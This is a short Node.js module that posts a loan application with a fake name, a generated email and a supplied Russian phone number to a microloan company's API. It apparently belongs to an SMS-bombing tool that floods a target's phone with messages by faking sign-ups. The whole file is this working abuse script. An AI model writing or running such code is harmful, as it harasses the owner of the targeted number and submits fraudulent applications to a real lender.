const request = require("request");
const tools = require("../index.js")

module.exports.run = function(number){
	if(number.toString().startsWith('7')){
		request.post({
			url:'https://api.nadodeneg.ru/user', json: true,
				body: {
                    "last_name": "Иванов",
                    "first_name": "Иван",
                    "middle_name": "Андреевич",
                    "mobile_phone": number,
                    "email": tools.mailGen(),
                    "agree":true,
                    "is_esia_user":false,
                    "step":2,
                    "target_url":null,
                    "requested_amount":10000,
                    "requested_days":10
                }
		}, 
			function(err, res, json) {
				/**/
		});
	}
}
